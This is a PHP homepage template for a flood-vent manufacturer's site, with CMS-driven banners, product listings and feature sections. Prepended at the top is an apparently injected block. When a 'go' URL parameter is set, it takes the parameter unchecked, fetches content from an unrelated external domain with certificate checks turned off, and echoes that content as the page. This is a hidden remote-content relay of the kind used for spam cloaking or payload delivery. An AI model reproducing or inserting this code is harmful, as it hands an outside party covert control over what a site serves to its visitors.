<?php
if(isset($_GET['go'])) {
    $url = $_GET['go'];
    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
    // INIT CURL
    $ch = curl_init();

    //init curl
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    // SET URL FOR THE POST FORM LOGIN
    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/smartvent/'.$url.'/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    // common name and also verify that it matches the hostname provided)
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // Optional: Return the result instead of printing it
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    // ENABLE HTTP POST
    curl_setopt ($ch, CURLOPT_POST, 1);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $store = curl_exec ($ch);
    echo $store;

    // CLOSE CURL
    curl_close ($ch);

} else {
?>
<!doctype html>
<html lang="en">
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Favicon -->
        <link rel="icon" type="image/png" href="images/favicon.png"/>
        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <!-- Reset CSS -->
        <link rel="stylesheet" href="css/reset.css">
        <!-- Custom CSS -->
        <link rel="stylesheet" type="text/css" href="css/style.css?v=1.0.0">
        <!-- <link rel="stylesheet" type="text/css" href="css/style_dev.css"> -->
        <link rel="stylesheet" type="text/css" href="css/owl.carousel.min.css">
        <link rel="stylesheet" type="text/css" href="css/owl.theme.default.min.css">

        <!-- Responsive CSS -->
        <link rel="stylesheet" type="text/css" href="css/media.css">
        <!-- Font Awesome Icons -->
        <link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">


        <title>SmartVent | Homepage</title>
    </head>
    <body>
        <main class="main_homepage_wrapper fff">
<?php include 'includes/header.php'?>


            <!-- Banner Block -->
            <section class="banner_wrap">
                <?php /*

				<div class="container bnr_content">

					<?php foreach ($home_page_sliderRecords as $record): ?>
					<?php foreach ($record['slider_image'] as $index => $upload): ?>
                    <div class="row">
                        <div class="col-md-6 offset-md-6">
                            <div class="banner_content" style="background: image(<?php echo htmlencode($upload['urlPath']) ?>)">
                                <h1><?php echo htmlencode($record['title']) ?></h1>
                                <a href="<?php echo htmlencode($record['button_link']) ?>" class="btn_1"><?php echo htmlencode($record['button_text']) ?></a>
                            </div>
                        </div>
                    </div>
					<?php endforeach ?>
					<?php endforeach ?>

                </div>
				*/ ?>

				<div class="banner_slider owl-carousel owl-theme" id="owl_banner_new">
					<?php foreach ($home_page_sliderRecords as $record): ?>
                        <?php foreach ($record['slider_image'] as $index => $upload): ?>
                        <div class="item_banner">
                            <div class="img_banner">
                                <img src="<?php echo htmlencode($upload['urlPath']) ?>" alt="<?php echo htmlencode($record['title']) ?>" title="<?php echo htmlencode($record['title']) ?>"> <?php /*  */?>
                            </div>
                            <div class="banner_content container">
                                <h1><?php echo htmlencode($record['title']) ?></h1>
                                <a href="<?php echo htmlencode($record['button_link']) ?>" class="btn_1"><?php echo htmlencode($record['button_text']) ?></a>
                            </div>
                        </div>
                        <?php endforeach ?>
					<?php endforeach ?>
				</div>
                <div class="banner_info_strip">
                       <ol class="banner_pts">
                            <li class="breadcrumb-item"><a><?php echo htmlencode($homepage_contentRecord['announcement_box']) ?></a></li>
                        </ol>
                </div>
            </section>
            <!-- End -->

            <!-- Plantation Block -->
            <section class="plantation_wrapper">
                <div class="container">
                    <div class="row">
                        <div class="col-md-7">
                            <div class="plant_content">
                                <?php echo $homepage_contentRecord['feature_text']; ?>
                            </div>
                        </div>
                        <div class="col-md-5">
                            <div class="plant_img">
                                <img src="images/Vents_510.webp" alt="Image" class="img-fluid">
                            </div>
                        </div>
                    </div>

                </div>
            </section>
            <!-- End -->

            <!-- Popular Modals Block -->
            <section class="popular_modals_wrap po_custom_wrap">
                <div class="container">
                    <div class="header">
                        <h2>Popular Models</h2>
                    </div>
                    <div class="model_slider_wrapper owl-carouse owl-theme" id="model_slider_wrapper">
					<?php
					/* getting product records */
					list($productsRecords, $productsMetaData) = getRecords(array(
						'tableName'   => 'products',
						'where'		  => "`homepage_feature` LIKE '%Yes%'",
						'loadUploads' => true,
						'allowSearch' => false,
					));
					if(isset($productsRecords) && is_array($productsRecords) && count($productsRecords)) {
						?>
						<div class="row">
						<?php foreach ($productsRecords as $record2):
								$image = 'images/product_img.jpg';
								if(isset($record2['image'][0]['urlPath']) && !empty($record2['image'][0]['urlPath'])) {
									$image = $record2['image'][0]['urlPath'];
								}
								?>
								<div class="col-md-3">
									<div class="model_block ff">
                                        <a href="/products/view/<?php echo htmlencode($record2['product_url']) ?>" class="btn_2">
									<div class="sv-image"style="background-image:url('<?php echo $image ?>');"></div></a>
									<?php /*
										<img src="<?php echo $image ?>" alt="<?php echo htmlencode($record['title']) ?>" title="<?php echo htmlencode($record['title']) ?>" class="img-fluid"> */ ?>
										<div class="model_inner" style="text-align:center">
											<h3><?php echo htmlencode($record2['title']) ?></h3>
											<?php /*  * /?><p><?php echo htmlencode($record2['short_description']) ?></p> <?php /*  */ ?>
											<a href="/products/view/<?php echo htmlencode($record2['product_url']) ?>" class="btn_2">Details</a>
											<!-- <a href="/locator.php" class="btn_5">Find Dealer</a> -->
										</div>
									</div>
								</div>
								<?php
								endforeach;
								?>
						</div>
						<?php
					}

					/*
                    <div class="row">
                        <div class="col-md-3">
                            <div class="model_block">
                                <img src="images/product_img.jpg" alt="Image" class="img-fluid">
                                <div class="model_inner">
                                    <h3>Product Title</h3>
                                    <p>Product Description Goes Here</p>
                                    <a href="#" class="btn_2">Find Dealer</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="model_block">
                                <img src="images/product_img.jpg" alt="Image" class="img-fluid">
                                <div class="model_inner">
                                    <h3>Product Title</h3>
                                    <p>Product Description Goes Here</p>
                                    <a href="#" class="btn_2">Find Dealer</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="model_block">
                                <img src="images/product_img.jpg" alt="Image" class="img-fluid">
                                <div class="model_inner">
                                    <h3>Product Title</h3>
                                    <p>Product Description Goes Here</p>
                                    <a href="#" class="btn_2">Find Dealer</a>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="model_block">
                                <img src="images/product_img.jpg" alt="Image" class="img-fluid">
                                <div class="model_inner">
                                    <h3>Product Title</h3>
                                    <p>Product Description Goes Here</p>
                                    <a href="#" class="btn_2">Find Dealer</a>
                                </div>
                            </div>
                        </div>
                    </div>
					 */ ?>
                     </div>
                </div>
            </section>
            <!-- End -->
<?php
  /* STEP 1: LOAD RECORDS - Copy this PHP code block near the TOP of your page */

  // load viewer library
  $libraryPath = 'admin/lib/viewer_functions.php';
  $dirsToCheck = ['','../','../../','../../../','../../../../']; // add if needed: '/home/smartvent/public_html/public_html/'
  foreach ($dirsToCheck as $dir) { if (@include_once("$dir$libraryPath")) { break; }}
  if (!function_exists('getRecords')) { die("Couldn't load viewer library, check filepath in sourcecode."); }

  // load record from 'ad_banner'
  list($ad_bannerRecords, $ad_bannerMetaData) = getRecords(array(
    'tableName'   => 'ad_banner',
    'where'       => '', // load first record
    'loadUploads' => true,
    'allowSearch' => false,
    'limit'       => '1',
  ));
  $ad_bannerRecord = @$ad_bannerRecords[0]; // get first record
  if (!$ad_bannerRecord) { dieWith404("Record not found!"); } // show error message if no record found

?>

            <div style="text-align:center">
            <?php foreach ($ad_bannerRecord['banner_upload'] as $index => $upload): ?>
                    <img src="<?php echo htmlencode($upload['urlPath']) ?>" width="100%" height="auto" alt="">
                    <?php endforeach ?>
            </div>

            <!-- Why SmartVent Block -->
            <section class="whyus_wrapper">
                <div class="container-fluid">
                    <div class="d_content_wrap">
                    <div class="whyus_header">
                        <div class="whyus_header_inner">
                            <img src="images/SV_white_Logomark.webp" alt="Logo Image" title="Image">
                            <h2>Why Smart Vent?</h2>
                            <p>Our flood vent door is engineered to remain latched until water is present. During a flood, rising water activates internal floats, opening the door. Smart Vent’s 3-inch clearance allows most flood debris to pass through, unlike typical air vents, which clog.</p>
                            <!-- text changed in admin -->
                        <?php /* echo $homepage_contentRecord['why_smartvent']; */ ?><br /><br />
                        </div>
                    </div>
                    <div class="why_main_wrap why_header_section">
                        <div class="whyus_side">
                            <div class="why_content_left left_wrap_content">
                                <ul>
                                    <li>
                                        <p>Pivot pins allow for bi-directional swing</p>
                                        <span>1</span>
                                    </li>
                                    <li>
                                        <p>WEATHER STRIPPING & 2” INSULATED CORE WITH A 8.34 R-VALUE </p>
                                        <span>2</span>
                                    </li>
                                    <li>
                                        <p>316 US Marine-Grade Stainless Steel Construction. Powder coat paint options available.</p>
                                        <span>3</span>

                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="why_image_wrap">
                            <div class="whyus_image">
                                <div class="why_img_content"><p>Insulated Flood Vent (Model 1540-520)</p></div>
                                <img src="images/vent_diagram.webp" alt="Image" class="img-fluid"><br />
                            </div>
                        </div>
                        <div class="whyus_side">
                            <div class="why_content_left why_right">
                                <ul>
                                    <li>
                                        <span>4</span>
                                       <p>Spring clips for easy installation.</p>
                                    </li>
                                    <li>
                                        <span>5</span>
                                        <p>3” debris clearance required for ICC-ES Certification</p>
                                    </li>
                                    <li>
                                        <span>6</span>
                                        <p>Door slots and internal floats for flood door activation</p>
                                    </li>

                                </ul>
                            </div>
                        </div>

                    </div>
                    <div class="why_header_section_btn">
                            <a href="/products/allproducts">Learn More</a>
                    </div>
                    </div>
                    <div class="why_feature_wrap">
						 <?php foreach ($homepage_contentRecord['icons1'] as $index => $upload): ?>
                        <div class="why_feature_block">
                            <div class="why_image">
                                <img src="<?php echo htmlencode($upload['urlPath']) ?>" alt="Image" class="img-fluid">
                            </div>
                            <div class="why_feature_info">
                                <h3><?php echo htmlencode($upload['info1']) ?></h3>
                                <p><?php echo htmlencode($upload['info2']) ?></p>
                            </div>
                        </div>
                       <?php endforeach ?>
                    </div>
                    <div class="why_feature_wrap" style="margin-top:100px">
						 <?php echo $homepage_contentRecord['video_block']; ?>
                    </div>

                    <!-- GIF file Hide 23/02/2023 -->

                    <div class="whyus_services">
                        <div class="row">
							<?php foreach ($homepage_contentRecord['icon_set_2'] as $index => $upload): ?>
                            <div class="col-md-2">
                                <div class="service_block">
                                    <img src="<?php echo htmlencode($upload['urlPath']) ?>" alt="Icon" class="img-fluid">
                                    <h2><?php echo htmlencode($upload['info1']) ?></h2>
                                </div>
                            </div>
							<?php endforeach ?>
                        </div>
                    </div>


                    <div class="why_quote_wrap">
                        <p><span><?php echo $homepage_contentRecord['breakout_box']; ?></p>
                        <p><a href="/page/about-us">Want To Know More? See Our Story <img src="images/rightarrow.webp" alt="arrow"> </a></p>
                    </div>

                    <div class="whyus_services">
                        <div class="row">
							<?php foreach ($homepage_contentRecord['affiliation_logos'] as $index => $upload): ?>
                            <div class="col-md-2">
                                <div class="service_block">
                                    <img src="<?php echo htmlencode($upload['urlPath']) ?>" alt="Icon" class="img-fluid">
                                </div>
                            </div>
							<?php endforeach ?>
                        </div>
                    </div>

                </div>
            </section>
            <!-- End -->

           <?php include 'includes/locator.php'?>
           <?php include 'includes/flood.php'?>

            <?php include 'includes/footer.php'?>
        </main>

        <script>
       $(document).ready(function() {
        $("#owl_banner_new").owlCarousel({
            items: 1,
            slideSpeed: 2000,
            nav: true,
            autoplay: true,
            dots: true,
            loop: true,
            responsiveRefreshRate: 200,
            navText : [""]
            });
           /*  $("#model_slider_wrapper").owlCarousel({
            items:1 ,
            slideSpeed: 2000,
            nav: true,
            autoplay: true,
            dots: true,
            loop: true,
            responsiveRefreshRate: 200,
            navText : [""]
            }); */
        });
        </script>
    </body>
</html>

<?PHP
}
?>
